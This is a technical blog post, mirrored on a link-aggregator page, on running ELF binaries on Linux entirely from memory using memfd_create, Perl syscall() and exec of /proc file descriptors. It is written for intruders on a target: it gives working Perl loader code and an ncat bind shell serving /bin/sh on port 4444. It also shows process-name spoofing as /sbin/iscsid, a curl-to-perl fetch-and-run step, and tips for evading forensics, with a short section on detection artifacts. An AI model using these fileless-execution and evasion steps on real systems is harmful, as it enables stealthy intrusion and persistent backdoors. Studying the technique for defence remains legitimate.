<!DOCTYPE html>
<html lang="en">
<head>
    <title>
In-Memory-Only ELF Execution (Without tmpfs) Mrs Quis Will Think of a Better Title -
linksfor.dev(s)
    </title>
    <link rel="alternate" type="application/rss+xml" title="Linksfor.dev(s) feed" href="https://linksfor.dev/feed.rss" />
    <meta charset="utf-8">
    <meta name="Description" content="A curated source of links that devs might find interesting. Updated around the clock." />
    <meta name="google" value="notranslate">
    <link rel="stylesheet" type="text/css" href="/style.css" />
    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="grid">
        
<div class="readable">
    <div id="readOverlay" class="style-ebook"><div id="readInner" class="margin-medium size-medium"><h1>In-Memory-Only ELF Execution (Without tmpfs)  Mrs Quis Will Think of a Better Title</h1><div><div id="" class="page__content"><p>In which we run a normal ELF binary on Linux without touching the filesystem
(except <code class="highlighter-rouge">/proc</code>).</p><h2 id="introduction">Introduction</h2><p>Every so often, it’s handy to execute an ELF binary without touching disk.
Normally, putting it somewhere under <code class="highlighter-rouge">/run/user</code> or something else backed by
<a href="http://man7.org/linux/man-pages/man5/tmpfs.5.html">tmpfs</a> works just fine,
but, outside of disk forensics, that looks like a regular file operation.
Wouldn’t it be cool to just grab a chunk of memory, put our binary in there,
and run it without monkey-patching the kernel, <a href="https://grugq.github.io/docs/ul_exec.txt">rewriting <code class="highlighter-rouge">execve(2)</code> in
userland</a>, or <a href="/2018/03/11/process-injection-with-gdb.html">loading a library into
another process</a>?</p><p>Enter
<a href="https://dvdhrm.wordpress.com/2014/06/10/memfd_create2/"><code class="highlighter-rouge">memfd_create(2)</code></a>.
This handy little system call is something like
<a href="http://man7.org/linux/man-pages/man3/malloc.3.html"><code class="highlighter-rouge">malloc(3)</code></a>, but instead
of returning a pointer to a chunk of memory, it returns a file descriptor which
refers to an anonymous (i.e. memory-only) file.  This is only visible in the
filesystem as a symlink in <code class="highlighter-rouge">/proc/&lt;PID&gt;/fd/</code> (e.g. <code class="highlighter-rouge">/proc/10766/fd/3</code>), which,
as it turns out, <a href="https://0x00sec.org/t/super-stealthy-droppers/3715"><code class="highlighter-rouge">execve(2)</code> will happily use to execute an ELF
binary</a>.</p><p>The <a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html">manpage</a>
has the following to say on the subject of naming anonymous files:</p><blockquote><p>The name supplied in <code class="highlighter-rouge">name</code> [an argument to <code class="highlighter-rouge">memfd_create(2)</code>] is used as a
filename and will be displayed as the target of the corresponding symbolic
link in the directory <code class="highlighter-rouge">/proc/self/fd/</code>.  The displayed name is always prefixed
with <code class="highlighter-rouge">memfd:</code> and serves only for debugging purposes.  Names do not affect the
behavior of the file descriptor, and as such multiple files can have the same
name without any side effects.</p></blockquote><p>In other words, we can give it a name (to which <code class="highlighter-rouge">memfd:</code> will be prepended),
but what we call it doesn’t really do anything except help debugging (or
forensicing).  We can even give the anonymous file an empty name.</p><p>Listing <code class="highlighter-rouge">/proc/&lt;PID&gt;/fd</code>, anonymous files look like this:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stuart@ubuntu-s-1vcpu-1gb-nyc1-01:~<span class="nv">$ </span><span class="nb">ls</span><span class="nt">-l</span> /proc/10766/fd
total 0
lrwx------ 1 stuart stuart 64 Mar 30 23:23 0 -&gt; /dev/pts/0
lrwx------ 1 stuart stuart 64 Mar 30 23:23 1 -&gt; /dev/pts/0
lrwx------ 1 stuart stuart 64 Mar 30 23:23 2 -&gt; /dev/pts/0
lrwx------ 1 stuart stuart 64 Mar 30 23:23 3 -&gt; /memfd:kittens <span class="o">(</span>deleted<span class="o">)</span>
lrwx------ 1 stuart stuart 64 Mar 30 23:23 4 -&gt; /memfd: <span class="o">(</span>deleted<span class="o">)</span></code></pre></div></div><p>Here we see two anonymous files, one named <code class="highlighter-rouge">kittens</code> and one without a name at
all.  The <code class="highlighter-rouge">(deleted)</code> is inaccurate and looks a bit weird but <em>c’est la vie</em>.</p><h2 id="caveats">Caveats</h2><p>Unless we land on target with some way to call <code class="highlighter-rouge">memfd_create(2)</code>, from our
initial vector (e.g. injection into a Perl or Python program with
<a href="http://perldoc.perl.org/functions/eval.html"><code class="highlighter-rouge">eval()</code></a>),
we’ll need a way to execute system calls on target.  We could drop a binary to
do this, but then we’ve failed to acheive fileless ELF execution.  Fortunately,
Perl’s <a href="https://perldoc.perl.org/functions/syscall.html"><code class="highlighter-rouge">syscall()</code></a> solves
this problem for us nicely.</p><p>We’ll also need a way to write an entire binary to the target’s memory as the
contents of the anonymous file.  For this, we’ll put it in the source of the
script we’ll write to do the injection, but in practice pulling it down over
the network is a viable alternative.</p><p>As for the binary itself, it has to be, well, a binary.  Running scripts
starting with <code class="highlighter-rouge">#!/interpreter</code> doesn’t seem to work.</p><p>The last thing we need is a sufficiently new kernel.  Anything version
<a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html#VERSIONS">3.17</a>
(released <a href="https://kernelnewbies.org/LinuxVersions">05 October 2014</a>) or later
will work.  We can find the target’s kernel version with <code class="highlighter-rouge">uname -r</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stuart@ubuntu-s-1vcpu-1gb-nyc1-01:~<span class="nv">$ </span>uname <span class="nt">-r</span>
4.4.0-116-generic
</code></pre></div></div><h2 id="on-target">On Target</h2><p>Aside <code class="highlighter-rouge">execve(2)</code>ing an anonymous file instead of a regular filesystem file
and doing it all in Perl, there isn’t much difference from starting any other
program.  Let’s have a look at the system calls we’ll use.</p><h3 id="memfd_create2"><code class="highlighter-rouge">memfd_create(2)</code></h3><p>Much like a memory-backed <code class="highlighter-rouge">fd = open(name, O_CREAT|O_RDWR, 0700)</code>, we’ll use
the <code class="highlighter-rouge">memfd_create(2)</code> system call to make our anonymous file.  We’ll pass it
the <code class="highlighter-rouge">MFD_CLOEXEC</code> flag (analogous to <code class="highlighter-rouge">O_CLOEXEC</code>), so that the file descriptor
we get will be automatically closed when we <code class="highlighter-rouge">execve(2)</code> the ELF binary.</p><p>Because we’re using Perl’s <code class="highlighter-rouge">syscall()</code> to call the <code class="highlighter-rouge">memfd_create(2)</code>, we don’t
have easy access to a user-friendly libc wrapper function or, for that matter,
a nice human-readable <code class="highlighter-rouge">MFD_CLOEXEC</code> constant.  Instead, we’ll need to pass
<code class="highlighter-rouge">syscall()</code> the raw system call number for <code class="highlighter-rouge">memfd_create(2)</code> and the numeric
constant for <code class="highlighter-rouge">MEMFD_CLOEXEC</code>.  Both of these are found in header files in
<code class="highlighter-rouge">/usr/include</code>.  System call numbers are stored in <code class="highlighter-rouge">#define</code>s starting with
<code class="highlighter-rouge">__NR_</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stuart@ubuntu-s-1vcpu-1gb-nyc1-01:/usr/include<span class="nv">$ </span>egrep <span class="nt">-r</span><span class="s1">'__NR_memfd_create|MFD_CLOEXEC'</span><span class="k">*</span>
asm-generic/unistd.h:#define __NR_memfd_create 279
asm-generic/unistd.h:__SYSCALL<span class="o">(</span>__NR_memfd_create, sys_memfd_create<span class="o">)</span>
linux/memfd.h:#define MFD_CLOEXEC               0x0001U
x86_64-linux-gnu/asm/unistd_64.h:#define __NR_memfd_create 319
x86_64-linux-gnu/asm/unistd_32.h:#define __NR_memfd_create 356
x86_64-linux-gnu/asm/unistd_x32.h:#define __NR_memfd_create <span class="o">(</span>__X32_SYSCALL_BIT + 319<span class="o">)</span>
x86_64-linux-gnu/bits/syscall.h:#define SYS_memfd_create __NR_memfd_create
x86_64-linux-gnu/bits/syscall.h:#define SYS_memfd_create __NR_memfd_create
x86_64-linux-gnu/bits/syscall.h:#define SYS_memfd_create __NR_memfd_create
</code></pre></div></div><p>Looks like <code class="highlighter-rouge">memfd_create(2)</code> is system call number 319 on 64-bit Linux
(<code class="highlighter-rouge">#define __NR_memfd_create</code> in a file with a name ending in <code class="highlighter-rouge">_64.h</code>), and
<code class="highlighter-rouge">MFD_CLOEXEC</code> is a consatnt <code class="highlighter-rouge">0x0001U</code> (i.e. 1, in <code class="highlighter-rouge">linux/memfd.h</code>).  Now that
we’ve got the numbers we need, we’re almost ready to do the Perl equivalent of
C’s <code class="highlighter-rouge">fd = memfd_create(name, MFD_CLOEXEC)</code> (or more specifically, <code class="highlighter-rouge">fd =
syscall(319, name, MFD_CLOEXEC)</code>).</p><p>The last thing we need is a name for our file.  In a file listing, <code class="highlighter-rouge">/memfd:</code> is
probably a bit better-looking than <code class="highlighter-rouge">/memfd:kittens</code>, so we’ll pass an empty
string to <code class="highlighter-rouge">memfd_create(2)</code> via <code class="highlighter-rouge">syscall()</code>.  Perl’s <code class="highlighter-rouge">syscall()</code> won’t take
string literals (due to passing a pointer under the hood), so we make a
variable with the empty string and use it instead.</p><p>Putting it together, let’s finally make our anonymous file:</p><div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">my</span><span class="nv">$name</span><span class="o">=</span><span class="s">""</span><span class="p">;</span><span class="k">my</span><span class="nv">$fd</span><span class="o">=</span><span class="nb">syscall</span><span class="p">(</span><span class="mi">319</span><span class="p">,</span><span class="nv">$name</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="o">==</span><span class="nv">$fd</span><span class="p">)</span><span class="p">{</span><span class="nb">die</span><span class="s">"memfd_create: $!"</span><span class="p">;</span><span class="p">}</span></code></pre></div></div><p>We now have a file descriptor number in <code class="highlighter-rouge">$fd</code>.  We can wrap that up in a Perl
one-liner which lists its own file descriptors after making the anonymous file:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stuart@ubuntu-s-1vcpu-1gb-nyc1-01:~<span class="nv">$ </span>perl <span class="nt">-e</span><span class="s1">'$n="";die$!if-1==syscall(319,$n,1);print`ls -l /proc/$$/fd`'</span>
total 0
lrwx------ 1 stuart stuart 64 Mar 31 02:44 0 -&gt; /dev/pts/0
lrwx------ 1 stuart stuart 64 Mar 31 02:44 1 -&gt; /dev/pts/0
lrwx------ 1 stuart stuart 64 Mar 31 02:44 2 -&gt; /dev/pts/0
lrwx------ 1 stuart stuart 64 Mar 31 02:44 3 -&gt; /memfd: <span class="o">(</span>deleted<span class="o">)</span></code></pre></div></div><h3 id="write2"><code class="highlighter-rouge">write(2)</code></h3><p>Now that we have an anonymous file, we need to fill it with ELF data.  First
we’ll need to get a Perl filehandle from a file descriptor, then we’ll need to
get our data in a format that can be written, and finally, we’ll write it.</p><p>Perl’s <a href="http://perldoc.perl.org/functions/open.html"><code class="highlighter-rouge">open()</code></a>, which is
normally used to open files, can also be used to turn an already-open file
descriptor into a file handle by specifying something like <code class="highlighter-rouge">&gt;&amp;=X</code> (where X is a
file descriptor) instead of a file name.  We’ll also want to enable
<a href="https://perl.plover.com/FAQs/Buffering.html">autoflush</a> on the new file
handle:</p><div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">open</span><span class="p">(</span><span class="k">my</span><span class="nv">$FH</span><span class="p">,</span><span class="s">'&gt;&amp;='</span><span class="o">.</span><span class="nv">$fd</span><span class="p">)</span><span class="ow">or</span><span class="nb">die</span><span class="s">"open: $!"</span><span class="p">;</span><span class="nb">select</span><span class="p">((</span><span class="nb">select</span><span class="p">(</span><span class="nv">$FH</span><span class="p">),</span><span class="vg">$|</span><span class="o">=</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]);</span></code></pre></div></div><p>We now have a file handle which refers to our anonymous file.</p><p>Next we need to make our binary available to Perl, so we can write it to the
anonymous file.  We’ll turn the binary into a bunch of Perl print statements
of which each write a chunk of our binary to the anonymous file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl <span class="nt">-e</span><span class="s1">'$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(&lt;&gt;)'</span> ./elfbinary
</code></pre></div></div><p>This will give us many, many lines similar to:</p><div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="nv">$FH</span><span class="nb">pack</span><span class="sx">q/H*/</span><span class="p">,</span><span class="sx">q/7f454c4602010100000000000000000002003e0001000000304f450000000000/</span><span class="ow">or</span><span class="nb">die</span><span class="sx">qq/write: $!/</span><span class="p">;</span><span class="k">print</span><span class="nv">$FH</span><span class="nb">pack</span><span class="sx">q/H*/</span><span class="p">,</span><span class="sx">q/4000000000000000c80100000000000000000000400038000700400017000300/</span><span class="ow">or</span><span class="nb">die</span><span class="sx">qq/write: $!/</span><span class="p">;</span><span class="k">print</span><span class="nv">$FH</span><span class="nb">pack</span><span class="sx">q/H*/</span><span class="p">,</span><span class="sx">q/0600000004000000400000000000000040004000000000004000400000000000/</span><span class="ow">or</span><span class="nb">die</span><span class="sx">qq/write: $!/</span><span class="p">;</span></code></pre></div></div><p>Exceuting those puts our ELF binary into memory.  Time to run it.</p><h3 id="optional-fork2">Optional: <code class="highlighter-rouge">fork(2)</code></h3><p>Ok, <a href="http://man7.org/linux/man-pages/man2/fork.2.html"><code class="highlighter-rouge">fork(2)</code></a>  is isn’t
actually a system call; it’s really a libc function which does all sorts of
stuff under the hood.  Perl’s
<a href="https://perldoc.perl.org/functions/fork.html"><code class="highlighter-rouge">fork()</code></a> is functionally
identical to libc’s as far as process-making goes: once it’s called, there are
now two nearly identical processes running (of which one, usually the child,
often finds itself calling <code class="highlighter-rouge">exec(2)</code>).  We don’t actually have to spawn a new
process to run our ELF binary, but if we want to do more than just run it and
exit (say, run it multiple times), it’s the way to go.  In general, using
<code class="highlighter-rouge">fork()</code> to spawn multiple children looks something like:</p><div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span><span class="p">(</span><span class="nv">$keep_going</span><span class="p">)</span><span class="p">{</span><span class="k">my</span><span class="nv">$pid</span><span class="o">=</span><span class="nb">fork</span><span class="p">();</span><span class="k">if</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="o">==</span><span class="nv">$pid</span><span class="p">)</span><span class="p">{</span><span class="c1"># Error</span><span class="nb">die</span><span class="s">"fork: $!"</span><span class="p">;</span><span class="p">}</span><span class="k">if</span><span class="p">(</span><span class="mi">0</span><span class="o">==</span><span class="nv">$pid</span><span class="p">)</span><span class="p">{</span><span class="c1"># Child</span><span class="c1"># Do child things here</span><span class="nb">exit</span><span class="mi">0</span><span class="p">;</span><span class="p">}</span><span class="p">}</span></code></pre></div></div><p>Another handy use of <code class="highlighter-rouge">fork()</code>, especially when done twice with a call to
<code class="highlighter-rouge">setsid(2)</code> in the middle, is to spawn a disassociated child and let the parent
terminate:</p><div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Spawn child</span><span class="k">my</span><span class="nv">$pid</span><span class="o">=</span><span class="nb">fork</span><span class="p">();</span><span class="k">if</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="o">==</span><span class="nv">$pid</span><span class="p">)</span><span class="p">{</span><span class="c1"># Error</span><span class="nb">die</span><span class="s">"fork1: $!"</span><span class="p">;</span><span class="p">}</span><span class="k">if</span><span class="p">(</span><span class="mi">0</span><span class="o">!=</span><span class="nv">$pid</span><span class="p">)</span><span class="p">{</span><span class="c1"># Parent terminates</span><span class="nb">exit</span><span class="mi">0</span><span class="p">;</span><span class="p">}</span><span class="c1"># In the child, become session leader</span><span class="k">if</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="o">==</span><span class="nb">syscall</span><span class="p">(</span><span class="mi">112</span><span class="p">))</span><span class="p">{</span><span class="nb">die</span><span class="s">"setsid: $!"</span><span class="p">;</span><span class="p">}</span><span class="c1"># Spawn grandchild</span><span class="nv">$pid</span><span class="o">=</span><span class="nb">fork</span><span class="p">();</span><span class="k">if</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="o">==</span><span class="nv">$pid</span><span class="p">)</span><span class="p">{</span><span class="c1"># Error</span><span class="nb">die</span><span class="s">"fork2: $!"</span><span class="p">;</span><span class="p">}</span><span class="k">if</span><span class="p">(</span><span class="mi">0</span><span class="o">!=</span><span class="nv">$pid</span><span class="p">)</span><span class="p">{</span><span class="c1"># Child terminates</span><span class="nb">exit</span><span class="mi">0</span><span class="p">;</span><span class="p">}</span><span class="c1"># In the grandchild here, do grandchild things</span></code></pre></div></div><p>We can now have our ELF process run multiple times or in a separate process.
Let’s do it.</p><h3 id="execve2"><code class="highlighter-rouge">execve(2)</code></h3><p>Linux process creation is a funny thing.  Ever since the <a href="http://www.read.seas.harvard.edu/~kohler/class/aosref/ritchie84evolution.pdf">early days of
Unix</a>,
process creation has been a combination of not much more than duplicating a
current process and swapping out the new clone’s program with what should be
running, and on Linux it’s no different.  The
<a href="http://man7.org/linux/man-pages/man2/execve.2.html"><code class="highlighter-rouge">execve(2)</code></a> system call
does the second bit: it changes one running program into another.  Perl gives
us <a href="http://perldoc.perl.org/functions/exec.html"><code class="highlighter-rouge">exec()</code></a>, which does more or
less the same, albiet with easier syntax.</p><p>We pass to <code class="highlighter-rouge">exec()</code> two things: the file containing the program to execute
(i.e.  our in-memory ELF binary) and a list of arguments, of which the first
element is usually taken as the process name.  Usually, the file and the
process name are the same, but since it’d look bad to have <code class="highlighter-rouge">/proc/&lt;PID&gt;/fd/3</code>
in a process listing, we’ll name our process something else.</p><p>The syntax for calling <code class="highlighter-rouge">exec()</code> is a bit odd, and explained much better in the
documentation.  For now, we’ll take it on faith that the file is passed as a
string in curly braces and there follows a comma-separated list of process
arguments.  We can use the variable <code class="highlighter-rouge">$$</code> to get the pid of our own Perl
process.  For the sake of clarity, the following assumes we’ve put <code class="highlighter-rouge">ncat</code> in
memory, but in practice, it’s better to use something which takes arguments
that don’t look like a backdoor.</p><div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec</span><span class="p">{</span><span class="s">"/proc/$$/fd/$fd"</span><span class="p">}</span><span class="s">"kittens"</span><span class="p">,</span><span class="s">"-kvl"</span><span class="p">,</span><span class="s">"4444"</span><span class="p">,</span><span class="s">"-e"</span><span class="p">,</span><span class="s">"/bin/sh"</span><span class="ow">or</span><span class="nb">die</span><span class="s">"exec: $!"</span><span class="p">;</span></code></pre></div></div><p>The new process won’t have the anonymous file open as a symlink in
<code class="highlighter-rouge">/proc/&lt;PID&gt;/fd</code>, but the anonymous file will be visible as the
<code class="highlighter-rouge">/proc/&lt;PID&gt;/exe</code> symlink, which normally points to the file containing the
program which is being executed by the process.</p><p>We’ve now got an ELF binary running without putting anything on disk or even in
the filesystem.</p><h3 id="scripting-it">Scripting it</h3><p>It’s not likely we’ll have the luxury of being able to sit on target and do all
of the above by hand.   Instead, we’ll pipe the script (<code class="highlighter-rouge">elfload.pl</code> in the
example below) via SSH to Perl’s stdin, and use a bit of shell trickery to keep
<code class="highlighter-rouge">perl</code> with no arguments from showing up in the process list:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> ./elfload.pl | ssh user@target /bin/bash <span class="nt">-c</span><span class="s1">'"exec -a /sbin/iscsid perl"'</span></code></pre></div></div><p>This will run Perl, renamed in the process list to <code class="highlighter-rouge">/sbin/iscsid</code> with no
arguments. When not given a script or a bit of code with <code class="highlighter-rouge">-e</code>, Perl expects a
script on stdin, so we send the script to perl stdin via our local SSH client.
The end result is our script is run without touching disk at all.</p><p>Without creds but with access to the target (i.e. after exploiting on), in most
cases we can probably use the devopsy <code class="highlighter-rouge">curl http://server/elfload.pl | perl</code>
trick (or intercept someone doing the trick for us).  As long as the script
makes it to Perl’s stdin and Perl gets an EOF when the script’s all read, it
doesn’t particularly matter how it gets there.</p><h2 id="artifacts">Artifacts</h2><p>Once running, the only real difference between a program running from an
anonymous file and a program running from a normal file is the
<code class="highlighter-rouge">/proc/&lt;PID&gt;/exe</code> symlink.</p><p>If something’s monitoring system calls (e.g. someone’s running <code class="highlighter-rouge">strace -f</code> on
sshd), the <code class="highlighter-rouge">memfd_create(2)</code> calls will stick out, as will passing paths in
<code class="highlighter-rouge">/proc/&lt;PID&gt;/fd</code> to <code class="highlighter-rouge">execve(2)</code>.</p><p>Other than that, there’s very little evidence anything is wrong.</p><h2 id="demo">Demo</h2><p>To see this in action, have a look at this asciicast.
<a href="https://asciinema.org/a/173715"><img src="https://asciinema.org/a/173715.png" alt="asciicast"></a></p><h2 id="tldr">TL;DR</h2><p>In C (translate to your non-disk-touching language of choice):</p><ol><li><code class="highlighter-rouge">fd = memfd_create("", MFD_CLOEXEC);</code></li><li><code class="highlighter-rouge">write(fd, elfbuffer, elfbuffer_len);</code></li><li><code class="highlighter-rouge">asprintf(p, "/proc/self/fd/%i", fd); execl(p, "kittens", "arg1", "arg2", NULL);</code></li></ol><hr><p><em>Updated 20170402 to link to
https://0x00sec.org/t/super-stealthy-droppers/3715, from where I got
<code class="highlighter-rouge">execve("/proc/&lt;PID&gt;/fd/&lt;FD&gt;...</code></em></p></div></div></div></div>
</div>
    </div>
    <footer>
        <div>created by buildstarted &copy; 2020 <a href="/about">about</a></div>
        <div>Share this page on social media: copy and paste this url https://linksfor.dev/</div>
        <div>If you prefer RSS: <a href="https://linksfor.dev/feed.xml">https://linksfor.dev/feed.xml</a></div>
    </footer>
    
    <script>
        (function () {
            var COLLECT_URL = "https://dna.buildstarted.com/t";
            var SITE_ID = "linksfor.devs";
            var GLOBAL_VAR_NAME = "__DNA__";

            window[GLOBAL_VAR_NAME] = {};

            window[GLOBAL_VAR_NAME].sendPageView = function () {
                var path = location.pathname;
                var referrer = document.referrer;

                var url = COLLECT_URL + "?siteid=" + SITE_ID + "&p=" + encodeURIComponent(path) + "&r=" + encodeURIComponent(referrer);

                try { fetch(url, { method: "GET" }); } catch (e) { }
            };

            window[GLOBAL_VAR_NAME].sendPageView();
        })();
    </script>
</body>
</html>